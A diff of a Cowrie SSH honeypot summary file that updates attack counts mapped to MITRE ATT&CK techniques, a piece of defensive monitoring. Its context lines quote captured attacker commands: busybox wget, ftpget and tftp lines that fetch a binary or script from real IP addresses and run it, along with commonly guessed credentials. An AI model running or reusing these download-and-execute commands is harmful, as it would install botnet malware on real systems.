@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-14 07:00:42",
+  "generated": "2026-08-14 08:03:42",
   "totals": {
-    "commands": 372,
-    "login_failed": 1069,
-    "login_success": 26,
-    "sessions": 1215
+    "commands": 381,
+    "login_failed": 1118,
+    "login_success": 29,
+    "sessions": 1271
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1069,
+      "count": 1118,
       "examples": [
         "dispatch-sjjr / dispatch-sjjr",
         "root / 123321",
@@ -21,8 +21,8 @@
         "root / 12345"
       ],
       "first": "2026-08-14T00:01:53.440937Z",
-      "last": "2026-08-14T07:00:07.157137Z",
-      "unique_ips": 33
+      "last": "2026-08-14T08:03:39.009582Z",
+      "unique_ips": 35
     },
     {
       "id": "T1222.002",
@@ -44,7 +44,7 @@
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 26,
+      "count": 29,
       "examples": [
         "ubuntu / 123456",
         "enable\\x00 / linuxshell\\x00",
@@ -53,14 +53,14 @@
         "root / root"
       ],
       "first": "2026-08-14T00:11:55.270801Z",
-      "last": "2026-08-14T06:54:03.915143Z",
-      "unique_ips": 22
+      "last": "2026-08-14T07:42:13.498495Z",
+      "unique_ips": 23
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 21,
+      "count": 23,
       "examples": [
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
@@ -69,8 +69,8 @@
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
       ],
       "first": "2026-08-14T00:00:30.036482Z",
-      "last": "2026-08-14T05:16:20.388369Z",
-      "unique_ips": 6
+      "last": "2026-08-14T07:42:35.666774Z",
+      "unique_ips": 7
     },
     {
       "id": "T1082",
@@ -131,15 +131,15 @@
     ],
     [
       "system",
-      10
+      11
     ],
     [
       "shell",
-      10
+      11
     ],
     [
       "sh",
-      10
+      11
     ],
     [
       "enable",
@@ -171,7 +171,7 @@
     ],
     [
       "/bin/busybox UNSTABLE",
-      2
+      3
     ],
     [
       "ping; sh",
@@ -187,6 +187,18 @@
     ],
     [
       "Accept-Encoding: gzip",
+      1
+    ],
+    [
+      "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
+      1
+    ],
+    [
+      "python3 /tmp/bendi.py",
+      1
+    ],
+    [
+      "rm /tmp/bendi.py",
       1
     ]
   ]
